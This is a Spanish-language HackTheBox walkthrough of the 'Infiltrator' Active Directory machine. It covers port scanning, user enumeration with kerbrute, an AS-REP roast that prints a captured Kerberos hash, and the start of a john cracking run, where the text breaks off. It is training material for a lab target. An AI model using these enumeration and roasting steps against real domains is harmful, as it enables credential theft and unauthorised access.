---
title : "HackTheBox - Infiltrator"
date : "2025-01-27"
author : "sckull"
image : "images/posts/htb/infiltrator/cover.png"
meta_image : "images/posts/htb/infiltrator/cover.png"
tags : ["netexec", "kerbrute", "ASREPRoast", "bloodhound-ce", "password-spraying", "GenericAll", "getTGT", "dacledit", "change-password-ad", "addself-ad", "forcechangepassword-ad", "net", "bloodyAD", "krb5.conf", "evil-winrm", "output-messenger", "chisel", "wireshark", "brute-force", "ILSpy", "c#", "AES-cipher", "output-messenger-events", "msfvenom", "metasploit", "icacls", "7z", "7z2john", "bitlocker", "xfreerdp3", "rdp", "NTDS-db", "secretsdump", "ntdsdotsqlite", "netexec-gmsa", "certipy", "ESC4"]
categories : ["hackthebox","windows"]
description: "."
libraries:
- chart
---


{{< featuredImage alt="featured image" position="center" >}}

| Nombre | [Infiltrator](https://app.hackthebox.com/machines/623) ![box_img_maker](data:image/png;base64,AAABAAIAEBAAAAAAIAARBAAAJgAAABgYAAAAACAAvgcAADcEAACJUE5HDQoaCgAAAA1JSERSAAAAEAAAABAIBgAAAB/z/2EAAAPYSURBVHicNdPrT1tlAAfg33vOaWlp6YXLCligK5cBzjHcxNaNkTAZCaJmBPwAyDbnXMyiMZpNEj8QPiyRTDGGZAmJM8aZKU7dgkw2jKI4GTLZEActg9IG2lOg91JKb+c9fvL5Hx7S09PD9Pb2UgDse++8X2c6ZN5ubm485/X6631+n85isYq8281XVe0fc67aB5csFvXFvr5fAUAURUIAwKQ3yT/8+uPL9x/OtrpWlqO1tbW7/pqehmfTA6/XC5lcBrPZDOvjxxsvtrQopCBXGhuOvguAkr7z5zMq6xsup4Rk5x+XLmHcvoJ53k2ZVJJhAEjBgDKMmJJKaIVuF9toNuNA1wk45q0DwyM3L3AJlbZpw+tpt3/1pfBg5m9ijURJvkzOZGuzkJWnQyQcQSwcJp7tbdbu5KlzdFSkOztE2Fd9VsbJhjmVSr12fWho06xR6LovvI2B23cJcfHQFOhBKsqx/M8ciihBvjYTOcVGppal9Be7nQlyEv6F5495uK6ujjclUja3RgjQA6VGJqTQwX5vGmk6JZTF+SjWAMEZKwoqnkaesRCtz+1ncqbu0bU0jaG9o/MtbtPnrw/xvJiSJMmtazfAFJWC24qgylQGuT4TBpmAgD8Id3QbHMdicuIuspAiMxur4qbPd5RbsFhzxHiM6PR5iIe3QLJ0UAoCJr8ZxaOqpzBvW0Grk4exxgSW5ZCelYNsJkkStlksLC7qGN7tFjMz1TAU61FYtRf/RmMIlBlQdvok0lmCJ5RyqF5uxkK6FL8vWKDM1WF3eQk0ahWcLrfIxeKxdSlhC31LDjElSIhvZQlrAR8qi5pwpnwPdhIJjE1NYeiH73CkuhoqRQY8NpsopKUjFo26mcrSPSO+eBIzESKCU4K/cwdkYhJ/ftQPnXMdegF4JhTBxYMmtCrV0MozMB1nxG2GJXufrBjhQsHgsM3uaE8FA2rN4SOi3R8gQjIB2/g4qpUqlBw6jJh1EQKlCMVi2HA56a3R2ySSofYY3RvXmbDPv/vVkyc0TDIp/HztKjiGiBKWRSJdDsfcHMKzjxAnBAwVwbKseKO/nxSmpQktr7Rppn4bz2Mmbk5c9a6vf1/S0cnZCKE0U0MCBJREd8QHqRTCqTiSW1vizLpb/Gllmfi1GnrwjbOczbr4xeBngz8SAKirq9McP952xba22vLw/nS4pNioSgZDSEajMGTnQJufBz8B1ng+3HXqNZXL4fj8zOlT5wghMfJ/57qiIpl2X/XrhCMLDcea2mwOx0tUpLkFhQXiszU1rlKD4duBTz4dUygVJd0fdA8SQiillPwHCWDFqOvB+JUAAAAASUVORK5CYIKJUE5HDQoaCgAAAA1JSERSAAAAGAAAABgIBgAAAOB3PfgAAAeFSURBVHicbZVbcFSFAYa/c/bsbjabzQWyuUiWJJAESSiYBJIKIqDFsVgV8UalMLWtqddhpiPTMs7Q2k4vlgc7VYeRwXHQejd4KV5oCsUMIYQQIDEkJCSBXDbZa/Z6zp6zu+ecvlTH2v5v/8v3PX4C/2fLljVeNzJyYfbQocOrW1qaHygpcW+UZXlpNBbNn5vzm5NTU9FkUhm1W60dgmB5b/fux4YqKioWzczMeL/Nkr552traclevaf1DJBK9aXio8e3Nmzc9W15eltt9pgdFSZGUk8x65/D7/W6b3eZev/62dYoi79627f5992y75ylZUQ4/2nbsOXhP/x/B3r173Tdv3PSG3W7ffPpsL+NXJ5o7Ojro6urCNE0SsTh+vw9N03DmuXDkOrgyOoLH4ymKJeMveKqqcNhtv3/z7fyGkyeKHjl48KDytWDt2rtcq25ofjcnJ2fjF91nmG5vx6Ek2ffrfcRDYbKahgBIgoggCBimiSkKSHYbhW43Nfn5vPqnP7Jpxw4WuFwPeTxVIrALyAjNzc3WR9oePVBbV/vTvoEBAq++iuGb452USkJRcFgk7BYJi2liAURRRAcypoGm66QMnUW5udxnEZleuYqm7dshnaH/4sCzr7zy8rNSbW39Cpvdvu3SyCiBDz5AjEY4mFKxyDJFthycVis5CLjLSslzFxMKhTETSWRZRpUM5EwGr6zQXbWYO66M0n/0KBUtrQii8OOWlpZDAiBu3vz9p03BfE7wz/K7XffTOTjK6/88Rb4AYkKmrLSEils3EE2n6brYT2EmS3k4SlSRUe12KstK2JTnYNof5IIAqYrFRial7uzq6nxLam//uNnptO958cABVjevpLWuilXFRUjl1aQVlfHjx3GUlRDXDbIZneLScgLBALVOJ+UlJSzZeg9FYT+NJYU0yEm8g8MkbQ7x8b2P/nl+PjwoVVZWbG9qbixub2/nwdYGEARybBJL3AuJyWnsVdVkCnKoaawillBYl8gnnigm1DXEdQ2rWFhRgZBOccPdd2Kx6HD8C147P8wtt2xa1Nvbd5/k8Xg2nDhxEouaorSogOFz/ahKCj23mKG+L6nQ0jS1NtPQXE/GN0M27kAxSrkYjBLLczLZe5aq8hIGe3rII8vShYWokXk6T3WxrLZmk2SYevWZ3l5ydIPL45Oc7OgGI8OWHT+Eteu49s47XP30FJ9f9RNNpQgpCtZEgluvzqAUydRs3cry6nJ6jnyINh+haV0juabJ6e4z1NXULJUC/qArFAyxZvUqblxZx3dKClHSBh0xEzMSQdWzxEfGSZeXIwswNhdgUXgeM5pALC4lEfDTOTbKQ0/9HLscw6kqnJ30MhUKEwwG80Wfz2eagKhnMdMqea48Jk2Jad3Emu8it3U1xQ/vxF2zhEQ0QnB8jPp1N6LddivW6+uwVVfjN+DSyAROpwMzrSLZ7ZiGwZzPZ0rTXm/M7S52Z0UQJAk1GMai20iqCc7EoiQt4FxUzs7bb2dkfJz1LS08/Pjj/OqZZwj6/dgHL1JQtIBblOXoCQVRECEnlyJnEdPTsxEpFA6PuvJc7rGxy8xJOqIBhYUFZEbPEVFTGDl2JkZHcdx7L20Pbsea52Q+GkWVZYJ+P26Xi6qyclauaUELzuIbvsK14DwV5YsJhUIjkmSxdDTesGrd6wMXmHQswGN3IscTBLq7cWQNcosKMUfHGVy9hgZfkEBpGRmnnUeW1iEsXoLD0LELIurMHHnLljE2McV8ZpytTU2cPn36H+LiJVVv++Z8c3M+P0e6uhGtVlKaymQkQn/Qz9kro/QMDPDhvt8QsNtQrRbUk51krk2ier3Mz/kIBAKkFQVlzsf7X5xiPhYjGApeq66seV96741PfZXVCz5xFRT8bOxsD2P1DWRUDU3TEC0WADRBYCwYJPrR37Fs2Mi8d5a0YSCKIgCZdBoyGTrP9zHUd47qNa0c+/TY6/39fT6puDi39Y47tvxE03U+mpri0ptvEG1YgWEYSKKI8Z9ehDMakZERHO5FpLMZDF1H13VsNhuiKHK6r4/pox9zU90ytjz2GMMDA7/o6zv/rnjgwF+OD10afstpt7Ni5y6+BOR/ncDqykM3DFRdRxAEMlqaXosFLRYjq6QQRZFUMomRzeJNKUy8+Tfmi92sfeIJosEg/QMDL5w71z0oAfqR9s92A8uL3Qubcn9wJ2OfHEUwsqjxJHo4TCadQdSzXNIzNBbmIs5GSGkaXjXFSEZDiUepXl7P+iefxKIbnOo+89mBl1747ddFO378w3DNisp7r0/XHCktKmqMrb2J9MULOFwF5NXV4rJYUcNhVNOkNx7FLHCRtC1kZkEB07NeGtZv4O4dD6FrGsNDQx3n+87+CEgBCN+M/v79+0umprx/jSfi918eHjr03RvXbm5YsbK6f6AfANEiYppQUuKmcrGHO7ds4aWXXjwvy+rlpuamByYmJl62iPxyz5498lfM/xJ8tdbWm+/q6ek89tzzz1elEqldiUT8e2ktXZfjyCmorVlqLl1SHfF4PEPZrPGZpimvtbU9rdbXV605fPiVz7/N+jeeoKSPmOmQxwAAAABJRU5ErkJggg==)
|----------|:-------------:|
| **OS** | <span><p class="os_type"> Windows <img src="/images/icons/windows.png" class="img_type_os"/></p></span>
| **Puntos**   |  50
| **Dificultad** | Insane
| **Fecha de Salida** | 2024-08-31
|**IP** | 10.10.11.31
|**Maker** | <span><p class="user_maker"> [EmSec](https://www.hackthebox.eu/home/users/profile/962022)<img src="https://www.hackthebox.eu/badge/image/962022" class="img_user_maker"/> </p></span>
|{{< button pointer="none">}}Rated{{< /button >}} | {{< boxmd >}}
```chart
{
    "type": "bar",
    "data":  {
        "labels": ["Cake", "VeryEasy", "Easy", "TooEasy", "Medium", "BitHard","Hard","TooHard","ExHard","BrainFuck"],
        "datasets": [{
            "label": "User Rated Difficulty",
            "data": [111, 27, 90, 98, 205, 207, 472, 426, 298, 368],
            "backgroundColor": ["#9fef00","#9fef00","#9fef00", "#ffaf00","#ffaf00","#ffaf00","#ffaf00", "#ff3e3e","#ff3e3e","#ff3e3e"]
        }]
    },
    "options": {
        "scales": {
          "xAxes": [{"display": false}],
          "yAxes": [{"display": false}]
        },
        "legend": {"labels": {"fontColor": "white"}},
        "responsive": true
      }
}
```
{{< /boxmd >}} |

# Recon
## nmap
`nmap` muestra multiples puertos abiertos: http (80) y ssh (22).
```bash
# Nmap 7.95 scan initiated Wed May 21 01:58:39 2025 as: /usr/lib/nmap/nmap --privileged -p53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,15220,49668,49691,49692,49694,49727,49750,49867 -sV -sC -oN nmap_scan 10.10.11.31
Nmap scan report for 10.10.11.31
Host is up (0.23s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        (generic dns response: SERVFAIL)
| fingerprint-strings: 
|   DNS-SD-TCP: 
|     _services
|     _dns-sd
|     _udp
|_    local
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Infiltrator.htb
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-20 23:26:58Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-20T23:30:37+00:00; -6h31m27s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR
| Not valid before: 2024-08-04T18:48:15
|_Not valid after:  2099-07-17T18:48:15
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR
| Not valid before: 2024-08-04T18:48:15
|_Not valid after:  2099-07-17T18:48:15
|_ssl-date: 2025-05-20T23:30:38+00:00; -6h31m27s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-20T23:30:37+00:00; -6h31m27s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR
| Not valid before: 2024-08-04T18:48:15
|_Not valid after:  2099-07-17T18:48:15
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR
| Not valid before: 2024-08-04T18:48:15
|_Not valid after:  2099-07-17T18:48:15
|_ssl-date: 2025-05-20T23:30:38+00:00; -6h31m27s from scanner time.
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-05-20T23:30:38+00:00; -6h31m27s from scanner time.
| ssl-cert: Subject: commonName=dc01.infiltrator.htb
| Not valid before: 2025-05-19T18:00:34
|_Not valid after:  2025-11-18T18:00:34
| rdp-ntlm-info: 
|   Target_Name: INFILTRATOR
|   NetBIOS_Domain_Name: INFILTRATOR
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: infiltrator.htb
|   DNS_Computer_Name: dc01.infiltrator.htb
|   DNS_Tree_Name: infiltrator.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2025-05-20T23:29:52+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
15220/tcp open  unknown
49668/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
49727/tcp open  msrpc         Microsoft Windows RPC
49750/tcp open  msrpc         Microsoft Windows RPC
49867/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.95%I=7%D=5/21%Time=682D6BA6%P=x86_64-pc-linux-gnu%r(DNS-
SF:SD-TCP,30,"\0\.\0\0\x80\x82\0\x01\0\0\0\0\0\0\t_services\x07_dns-sd\x04
SF:_udp\x05local\0\0\x0c\0\x01");
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -6h31m28s, deviation: 2s, median: -6h31m27s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-05-20T23:29:52
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed May 21 02:02:07 2025 -- 1 IP address (1 host up) scanned in 208.11 seconds
```

Agregamos a nuestro archivo `/etc/hosts` los valores `infiltrator.htb` `dc01.infiltrator.htb`.

## Services Access - Null Sesion
Sesiones nulas en el servicio smb, ldap y rpc no son aceptadas.
```bash
❯ netexec smb 10.10.11.31 -u '' -p '' --shares
SMB         10.10.11.31     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.31     445    DC01             [+] infiltrator.htb\: 
SMB         10.10.11.31     445    DC01             [-] Error enumerating shares: STATUS_ACCESS_DENIED
❯ netexec ldap 10.10.11.31 -u '' -p ''
SMB         10.10.11.31     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.31     389    DC01             [-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C090C77, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4563
LDAP        10.10.11.31     389    DC01             [+] infiltrator.htb\: 
❯ rpcclient -N -U "" 10.10.11.31
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $> exit
❯
```

## Web Site
Los headers del sitio muestra un `Microsoft-IIS 10`.
```bash
❯ curl -sI 10.10.11.31
HTTP/1.1 200 OK
Content-Length: 31235
Content-Type: text/html
Last-Modified: Mon, 19 Feb 2024 00:41:24 GMT
Accept-Ranges: bytes
ETag: "361ade5dcc62da1:0"
Server: Microsoft-IIS/10.0
Date: Tue, 20 May 2025 23:35:54 GMT

❯
```

El sitio presenta una tematica de Marketing ademas, el sitio parece ser estatico, no muestra algun tipo de funcionalidad.

2025_20222271705.png[IMAGE]

Se presenta al equipo de la empresa, ocho miembros en total.

2025_20222271829.png[IMAGE]


### Directory Brute Forcing
`feroxbuster` unicamente muestra recursos estaticos del sitio.
```bash
❯ feroxbuster -u http://infiltrator.htb/ -w $MD
                                                                                                                                                                                        
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://infiltrator.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        8l       36w     1074c http://infiltrator.htb/assets/js/jquery.counterup.min.js
200      GET        8l      165w     8051c http://infiltrator.htb/assets/js/waypoints.min.js
200      GET        6l       69w     3660c http://infiltrator.htb/assets/images/contact-info-03.png
200      GET        9l       77w     3371c http://infiltrator.htb/assets/images/contact-info-01.png
200      GET        7l       63w     2938c http://infiltrator.htb/assets/images/features-icon-1.png
200      GET      186l      505w     4930c http://infiltrator.htb/assets/css/owl-carousel.css
200      GET      206l      380w     4940c http://infiltrator.htb/assets/js/custom.js
200      GET        2l       89w     4572c http://infiltrator.htb/assets/js/scrollreveal.min.js
200      GET        5l       69w     3366c http://infiltrator.htb/assets/images/contact-info-02.png
200      GET        7l       65w     3520c http://infiltrator.htb/assets/images/service-item-01.png
200      GET      108l      545w    49592c http://infiltrator.htb/assets/images/project-item-01.jpg
200      GET       52l      338w    26333c http://infiltrator.htb/assets/images/project-item-05.jpg
200      GET      322l     1058w    54064c http://infiltrator.htb/assets/images/slide-03.jpg
200      GET       90l      517w    47789c http://infiltrator.htb/assets/images/member-item-07.jpg
200      GET      157l      862w    70811c http://infiltrator.htb/assets/images/project-item-03.jpg
200      GET        1l      233w    19796c http://infiltrator.htb/assets/js/imgfix.min.js
200      GET       75l      438w    36480c http://infiltrator.htb/assets/images/project-item-02.jpg
200      GET      203l      389w     3828c http://infiltrator.htb/assets/css/lightbox.css
200      GET       70l      392w    41119c http://infiltrator.htb/assets/images/member-item-01.jpg
200      GET      118l      603w    45109c http://infiltrator.htb/assets/images/member-item-04.jpg
200      GET      121l      673w    45956c http://infiltrator.htb/assets/images/member-item-03.jpg
200      GET      519l     1710w    18929c http://infiltrator.htb/assets/js/lightbox.js
200      GET      139l      637w    47039c http://infiltrator.htb/assets/images/member-item-05.jpg
200      GET      617l     1638w    31235c http://infiltrator.htb/index.html
200      GET      135l      669w    57825c http://infiltrator.htb/assets/images/project-item-06.jpg
200      GET     2337l     3940w    39751c http://infiltrator.htb/assets/css/font-awesome.css
200      GET      124l      641w    57511c http://infiltrator.htb/assets/images/project-item-04.jpg
200      GET      171l      746w    55697c http://infiltrator.htb/assets/images/member-item-02.jpg
200      GET       12l      558w    35324c http://infiltrator.htb/assets/js/isotope.js
200      GET      172l     1148w    72183c http://infiltrator.htb/assets/images/slide-01.jpg
200      GET     1672l     3560w    34773c http://infiltrator.htb/assets/css/templatemo-breezed.css
200      GET     2445l    10688w    83672c http://infiltrator.htb/assets/js/popper.js
200      GET      243l     1328w    73286c http://infiltrator.htb/assets/images/slide-02.jpg
200      GET      204l     1115w    86505c http://infiltrator.htb/assets/images/project-big-item-05.jpg
200      GET        7l      662w    58078c http://infiltrator.htb/assets/js/bootstrap.min.js
200      GET      306l     1656w   136332c http://infiltrator.htb/assets/images/project-big-item-02.jpg
200      GET      278l     1583w   114385c http://infiltrator.htb/assets/images/project-big-item-01.jpg
200      GET        4l     1304w    83617c http://infiltrator.htb/assets/js/jquery-2.1.0.min.js
200      GET     2892l     6607w    87155c http://infiltrator.htb/assets/js/slick.js
200      GET     3448l    10094w    93440c http://infiltrator.htb/assets/js/owl-carousel.js
200      GET        7l     1966w   155764c http://infiltrator.htb/assets/css/bootstrap.min.css
200      GET      609l     3241w   266155c http://infiltrator.htb/assets/images/project-big-item-03.jpg
200      GET      422l     2618w   230919c http://infiltrator.htb/assets/images/project-big-item-04.jpg
200      GET      437l     2587w   224090c http://infiltrator.htb/assets/images/project-big-item-06.jpg
301      GET        2l       10w      153c http://infiltrator.htb/assets => http://infiltrator.htb/assets/
403      GET       29l       92w     1233c http://infiltrator.htb/assets/css/
403      GET       29l       92w     1233c http://infiltrator.htb/assets/
301      GET        2l       10w      160c http://infiltrator.htb/assets/images => http://infiltrator.htb/assets/images/
403      GET       29l       92w     1233c http://infiltrator.htb/assets/images/
403      GET       29l       92w     1233c http://infiltrator.htb/assets/js/
301      GET        2l       10w      160c http://infiltrator.htb/assets/Images => http://infiltrator.htb/assets/Images/
200      GET     6259l    31957w  2686127c http://infiltrator.htb/assets/images/member-item-06.jpg
200      GET      617l     1638w    31235c http://infiltrator.htb/
301      GET        2l       10w      157c http://infiltrator.htb/assets/css => http://infiltrator.htb/assets/css/
301      GET        2l       10w      156c http://infiltrator.htb/assets/js => http://infiltrator.htb/assets/js/
301      GET        2l       10w      159c http://infiltrator.htb/assets/fonts => http://infiltrator.htb/assets/fonts/
301      GET        2l       10w      160c http://infiltrator.htb/assets/IMAGES => http://infiltrator.htb/assets/IMAGES/
301      GET        2l       10w      153c http://infiltrator.htb/Assets => http://infiltrator.htb/Assets/
301      GET        2l       10w      160c http://infiltrator.htb/Assets/images => http://infiltrator.htb/Assets/images/
301      GET        2l       10w      160c http://infiltrator.htb/Assets/Images => http://infiltrator.htb/Assets/Images/
301      GET        2l       10w      157c http://infiltrator.htb/Assets/css => http://infiltrator.htb/Assets/css/
301      GET        2l       10w      159c http://infiltrator.htb/assets/Fonts => http://infiltrator.htb/assets/Fonts/
301      GET        2l       10w      156c http://infiltrator.htb/Assets/js => http://infiltrator.htb/Assets/js/
301      GET        2l       10w      159c http://infiltrator.htb/Assets/fonts => http://infiltrator.htb/Assets/fonts/
301      GET        2l       10w      160c http://infiltrator.htb/Assets/IMAGES => http://infiltrator.htb/Assets/IMAGES/
301      GET        2l       10w      157c http://infiltrator.htb/assets/CSS => http://infiltrator.htb/assets/CSS/
301      GET        2l       10w      156c http://infiltrator.htb/assets/JS => http://infiltrator.htb/assets/JS/
301      GET        2l       10w      159c http://infiltrator.htb/Assets/Fonts => http://infiltrator.htb/Assets/Fonts/
301      GET        2l       10w      157c http://infiltrator.htb/Assets/CSS => http://infiltrator.htb/Assets/CSS/
301      GET        2l       10w      156c http://infiltrator.htb/Assets/JS => http://infiltrator.htb/Assets/JS/
404      GET        0l        0w     1245c http://infiltrator.htb/assets/images/102953
404      GET        0l        0w     1245c http://infiltrator.htb/Assets/images/Nabila
404      GET        0l        0w     1245c http://infiltrator.htb/Assets/fonts/129762
404      GET        0l        0w     1245c http://infiltrator.htb/Assets/css/98744
404      GET        0l        0w     1245c http://infiltrator.htb/assets/fonts/143292
404      GET        0l        0w     1245c http://infiltrator.htb/Assets/IMAGES/27205
404      GET        0l        0w     1245c http://infiltrator.htb/assets/Images/121431
404      GET        0l        0w     1245c http://infiltrator.htb/Assets/71372
404      GET        0l        0w     1245c http://infiltrator.htb/assets/JS/103329
404      GET        0l        0w     1245c http://infiltrator.htb/assets/JS/103330
404      GET        0l        0w     1245c http://infiltrator.htb/Assets/Fonts/10298114
404      GET        0l        0w     1245c http://infiltrator.htb/Assets/images/96869
404      GET        0l        0w     1245c http://infiltrator.htb/Assets/58609
404      GET        0l        0w     1245c http://infiltrator.htb/Assets/JS/imagesb
404      GET        0l        0w     1245c http://infiltrator.htb/Assets/images/129396
404      GET        0l        0w     1245c http://infiltrator.htb/Assets/123343
404      GET        0l        0w     1245c http://infiltrator.htb/Assets/images/Nadesico%20TV%20and%20Movie
404      GET        0l        0w     1245c http://infiltrator.htb/assets/Images/103159
404      GET        0l        0w     1245c http://infiltrator.htb/Assets/CSS/statistiques
404      GET        0l        0w     1245c http://infiltrator.htb/assets/84813
404      GET        0l        0w     1245c http://infiltrator.htb/assets/images/29779
404      GET        0l        0w     1245c http://infiltrator.htb/Assets/Images/cjkvinfo
404      GET        0l        0w     1245c http://infiltrator.htb/assets/images/103070
404      GET        0l        0w     1245c http://infiltrator.htb/Assets/JS/icon_time
404      GET        0l        0w     1245c http://infiltrator.htb/102504
404      GET        0l        0w     1245c http://infiltrator.htb/assets/JS/dl4482
404      GET        0l        0w     1245c http://infiltrator.htb/Assets/css/t4371
404      GET        0l        0w     1245c http://infiltrator.htb/Assets/Images/t4208
```

## Kerbrute - Userenum
Creamos un wordlist con los nombres y apellidos del equipo. Ejecutamos [usernames.py](https://github.com/sckull/ctf-stuff/blob/master/scripts/usernames.py) sobre este para generar un nuevo wordlist de usuarios.
```bash
❯ cat usersweb.txt
DAVID ANDERSON
OLIVIA MARTINEZ
KEVIN TURNER
AMANDA WALKER
MARCUS HARRIS
LAUREN CLARK
ETHAN RODRIGUEZ
❯ wc -l usersweb.txt
8 usersweb.txt
❯ 
❯ ../tools/usernames.py usersweb.txt > users.txt
❯ wc -l users.txt
70 users.txt
❯
```

Ejecutamos [kerbrute](https://github.com/ropnop/kerbrute) especificando la enumeracion de usuarios. Encontramos siete usuarios validos. Creamos un nuevo wordlist con estos.
```bash
❯ ../tools/kerbrute userenum --dc dc01.infiltrator.htb -d infiltrator.htb users.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 05/21/25 - Ronnie Flathers @ropnop

2025/05/21 02:19:52 >  Using KDC(s):
2025/05/21 02:19:52 >  	dc01.infiltrator.htb:88

2025/05/21 02:19:52 >  [+] VALID USERNAME:	d.anderson@infiltrator.htb
2025/05/21 02:19:52 >  [+] VALID USERNAME:	o.martinez@infiltrator.htb
2025/05/21 02:19:52 >  [+] VALID USERNAME:	k.turner@infiltrator.htb
2025/05/21 02:19:52 >  [+] VALID USERNAME:	a.walker@infiltrator.htb
2025/05/21 02:19:53 >  [+] VALID USERNAME:	m.harris@infiltrator.htb
2025/05/21 02:19:53 >  [+] VALID USERNAME:	e.rodriguez@infiltrator.htb
2025/05/21 02:19:53 >  [+] VALID USERNAME:	l.clark@infiltrator.htb
2025/05/21 02:19:53 >  Done! Tested 70 usernames (7 valid) in 1.932 seconds
❯ ../tools/kerbrute userenum --dc dc01.infiltrator.htb -d infiltrator.htb users.txt | grep VALID | cut -d ':' -f4 | cut -d '@' -f1 | tr -d '\t' > valid_users.txt
❯ wc -l valid_users.txt
7 valid_users.txt
❯ cat valid_users.txt
d.anderson
o.martinez
k.turner
a.walker
m.harris
e.rodriguez
l.clark
❯
```

# User - l.clark
## ASREPRoast - Impacket
Ejecutamos `GetNPUsers` para verificar si alguno de los usuarios es vulnerable a ASREPRoast, se muestra el hash de `l.clark`. 
```bash
❯ sudo ntpdate 10.10.11.31
[sudo] password for kali: 
2025-05-20 19:58:58.198331 (-0400) -23317.293199 +/- 0.121479 10.10.11.31 s1 no-leap
CLOCK: time stepped by -23317.293199
❯ impacket-GetNPUsers -no-pass -usersfile valid_users.txt -outputfile files/hashes.txt infiltrator.htb/ 2>/dev/null
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] User d.anderson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User o.martinez doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User k.turner doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User a.walker doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User m.harris doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User e.rodriguez doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$l.clark@INFILTRATOR.HTB:64a110ab8cfc4db2161991f6c200245d$f2fad0f2055354064bd4a185800c33f5cbc3146134f84a0613eba0a78b73bc42edd2173905d682bb847cbf93d55d7d4e5100f7ceb4ca287d3bcdfe51abba3f29879e8bcb03bee0cc3edf716ecdca0156aaf02ad9e38664d8770bec7d6f236f0f6741b1a69d3e697190fad0bfd8d50c3a25869618509efec44f4031f5107efffdc92ca0dc5a171ab5c8ca8eae3bbe8ce64a6979a74feab6e477c632d6eed274d42a930684a9ddb9d581ffce8b9b2a67af8ef6d3477e315439e036a6429e56105c4d7fa27a1a21ef03ed45ce19c9da2649b6bde968a7cf25f2c86f771c5d3b927aac37bef4646f730af64442118bbe15da0e91
❯
```
## Cracking the Hash
Ejecutamos john con el wordlist rockyou.txt sobre el archivo de hash, se muestra la contrasena en texto plano.
```bash
❯ john files/hashes.txt --wordlist=$ROCK
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
